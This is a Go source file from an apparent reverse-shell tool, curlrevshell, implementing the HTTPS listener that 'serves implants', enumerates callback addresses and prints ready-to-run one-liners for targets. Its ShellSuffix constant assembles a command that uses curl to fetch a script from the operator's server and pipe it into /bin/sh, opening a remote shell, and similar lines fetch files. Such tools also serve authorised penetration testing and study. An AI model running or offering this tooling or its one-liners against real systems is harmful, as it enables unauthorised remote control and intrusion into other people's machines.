// Package hsrv - HTTP server
package hsrv

/*
 * hsrv.go
 * HTTP server
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240329
 */

import (
	"cmp"
	"context"
	"fmt"
	"log"
	"net"
	"net/http"
	"net/netip"
	"slices"
	"strconv"
	"strings"
	"sync/atomic"
	"text/template"
	"time"

	"github.com/magisterquis/curlrevshell/lib/opshell"
	"github.com/magisterquis/curlrevshell/lib/sstls"
)

const (
	// CertLifespan is how long our self-signed cert lasts.  It's roughly
	// ten years.
	CertLifespan = 365 * 24 * time.Hour

	// CurlFormat prints the start of the curl command used to connect
	// to us.
	CurlFormat = `curl -sk --pinnedpubkey 'sha256//%s' 'https://%s`

	// FileSuffix is added to CurlFormat when telling the user how to get
	// a file.
	FileSuffix = "'"

	// ShellSuffix is added to CurlFormat when telling the user haw to get
	// a shell.
	ShellSuffix = "/c' | /bin/sh"
)

var (
	// CertSubject is the subject we use for the generated TLS certificate.
	CertSubject = "curlrevshell"
)

// Server serves implants over HTTPS.
type Server struct {
	fdir      string /* Static files directory. */
	ich       <-chan string
	och       chan<- opshell.CLine
	l         sstls.Listener
	ps        pinkSender
	tmpl      *template.Template
	curID     atomic.Pointer[string] /* Current implant ID. */
	cbAddrs   []string
	printIPv6 bool
}

// New returns a new Server, listening on addr.  Call its Do method to start it
// serving.  Call the returned cleanup function to deallocate resources
// allocated by New.  Static files will be served from fdir, if non-empty.  If
// tmplf is non-empty, it is taken as a file from which to read the callback
// template.
func New(
	addr string,
	fdir string,
	tmplf string,
	ich <-chan string,
	och chan<- opshell.CLine,
	certFile string,
	cbAddrs []string, /* Callback addresses, for one-liners. */
	printIPv6 bool,
) (*Server, func(), error) {
	var l sstls.Listener

	/* Work out our template. */
	var (
		tmpl *template.Template
		err  error
	)
	if "" != tmplf {
		if tmpl, err = template.ParseFiles(tmplf); nil != err {
			return nil, nil, fmt.Errorf(
				"parsing callback template from %s: %w",
				tmplf,
				err,
			)
		}
	} else {
		tmpl = template.Must(template.New("").Parse(DefaultTemplate))
	}

	/* cleanup closes the listener. */
	cleanup := func() {
		if nil != l.Listener {
			l.Close()
		}
	}

	/* Make sure the listen address has a port, and if not ask the OS to
	choose one for us. */
	if _, p, err := net.SplitHostPort(addr); "" == p || nil != err {
		addr = net.JoinHostPort(addr, "0")
	}

	/* Start our listener. */
	if l, err = sstls.Listen(
		"tcp",
		addr,
		CertSubject,
		CertLifespan,
		certFile,
	); nil != err {
		return nil, nil, fmt.Errorf("listening on %s: %w", addr, err)
	}

	return &Server{
		fdir:      fdir,
		ich:       ich,
		och:       och,
		l:         l,
		ps:        pinkSender{och},
		tmpl:      tmpl,
		cbAddrs:   cbAddrs,
		printIPv6: printIPv6,
	}, cleanup, nil
}

// Do actually serves HTTPS clients.
func (s *Server) Do(ctx context.Context) error {
	/* Set up a server. */
	hsvr := http.Server{
		Handler:  s.newMux(),
		ErrorLog: log.New(s.ps, "Server error: ", log.Lmsgprefix),
		BaseContext: func(_ net.Listener) context.Context {
			return ctx
		},
	}
	s.Logf(opshell.ColorNone, "Listening on %s", s.l.Addr())

	/* Work out our listen addresses, for user help. */
	as, err := s.listenAddresses()
	if nil != err {
		s.ErrorLogf("Error determining callback address: %s", err)
	}

	/* Tell user where to get static files. */
	if "" != s.fdir && 0 != len(as) {
		s.Logf(ScriptColor, "To get files from %s:", s.fdir)
		s.Printf(ScriptColor, "\n")
		for _, a := range as {
			s.Printf(
				ScriptColor,
				CurlFormat+FileSuffix,
				s.l.Fingerprint,
				a,
			)
		}
		s.Printf(ScriptColor, "\n")
	}

	/* Tell the user how to get a callback. */
	if 0 != len(as) {
		s.Logf(ScriptColor, "To get a shell:")
		s.Printf(ScriptColor, "\n")
		for _, a := range as {
			s.Printf(
				ScriptColor,
				CurlFormat+ShellSuffix,
				s.l.Fingerprint,
				a,
			)
		}
		s.Printf(ScriptColor, "\n")
	}

	/* Serve until we fail or the context is cancelled. */
	var ech = make(chan error, 1)
	go func() { ech <- hsvr.Serve(s.l) }()
	select {
	case err = <-ech:
	case <-ctx.Done():
	}

	/* Shutdown the server. */
	serr := hsvr.Shutdown(ctx)

	/* Return the first non-nil error. */
	return cmp.Or(err, serr)
}

// listenAddresseses gets all of the addresses we have for the box.
func (s *Server) listenAddresses() ([]string, error) {
	var addrs []string

	/* Parse the listen address and port, which we'll need for
	manually-added callback addresses. */
	ls := s.l.Addr().String()
	ap, err := netip.ParseAddrPort(ls)
	if nil != err {
		return nil, fmt.Errorf(
			"parsing listen address %s: %w",
			ls,
			err,
		)
	}
	port := strconv.Itoa(int(ap.Port()))

	/* Add extra addresses, for just in case. */
	for _, a := range s.cbAddrs {
		/* Make sure we have a port. */
		if _, p, err := net.SplitHostPort(a); "" == p || nil != err {
			a = net.JoinHostPort(a, port)
		}
		addrs = append(addrs, a)
	}

	/* If the listen address isn't a wildcard address, we're good with
	just i. */
	if !ap.Addr().IsUnspecified() {
		return sortAddresses(append(addrs, ap.String())), nil
	}

	/* Get all the addresses we know about. */
	nifs, err := net.Interfaces()
	if nil != err {
		return nil, fmt.Errorf("enumerating interfaces: %w", err)
	}
	for _, nif := range nifs {
		/* Dont print loopback addresses. */
		if 0 != net.FlagLoopback&nif.Flags {
			continue
		}
		/* Get this interface's addresses. */
		ifas, err := nif.Addrs()
		if nil != err {
			s.ErrorLogf(
				"Error getting addresses for %s: %s",
				nif.Name,
				err,
			)
			continue
		}
		/* Keep hold of each address on this interface. */
		for _, ifa := range ifas {
			ps := ifa.String()
			/* If we have a netmask, remove it. */
			p, err := netip.ParsePrefix(ps)
			if nil != err {
				s.ErrorLogf(
					"Error parsing "+
						"callback address %s: %s",
					ps,
					err,
				)
				continue
			}
			/* If it's IPv6, make sure we want it. */
			if p.Addr().Is6() && !s.printIPv6 {
				continue
			}
			/* Save the address with the listen port. */
			addrs = append(addrs, net.JoinHostPort(
				p.Addr().String(),
				port,
			))
		}
	}
	addrs = sortAddresses(addrs)

	/* If we haven't any addresses by this point, something's wrong. */
	if 0 == len(addrs) {
		return nil, fmt.Errorf("no interfaces have addresses")
	}

	return addrs, nil
}

// sortAddresses sorts a slice of addresses as string.  Non-IP:Port pairs come
// first, sorted lexicographically, then come IP addresses, sorted as per
// netip.AddrPort.Compare.  The returned slice is deduped via slices.Compact..
func sortAddresses(as []string) []string {
	slices.SortFunc(as, func(a, b string) int {
		/* If either both address are addresses or both aren't sort
		as normal. */
		aa, ea := netip.ParseAddrPort(a)
		ab, eb := netip.ParseAddrPort(b)
		if ea == nil && eb == nil {
			return aa.Compare(ab)
		} else if ea != nil && eb != nil {
			return strings.Compare(a, b)
		}
		/* Failing that, non-IP addresses sort before normal addreses,
		as they're likely what we were asked to print. */
		if ea == nil && eb != nil {
			return 1
		} else if ea != nil && eb == nil {
			return -1
		}
		/* Unpossible. */
		return 0
	})
	return slices.Compact(as)
}
